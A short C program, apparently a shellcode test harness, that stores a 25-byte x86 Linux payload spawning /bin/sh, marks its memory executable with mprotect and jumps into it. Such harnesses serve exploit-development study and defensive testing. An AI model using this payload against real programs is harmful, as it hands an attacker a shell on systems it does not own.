#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";

int main() {
    printf("Shellcode Length: %d\n", (int)strlen(shellcode));

    // Mark the shellcode memory as executable
    if (mprotect((void*)((unsigned long)shellcode & ~0xfff), 4096, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        perror("mprotect");
        return 1;
    }

    // Execute the shellcode
    int (*ret)() = (int(*)())shellcode;
    ret();

    return 0;
}
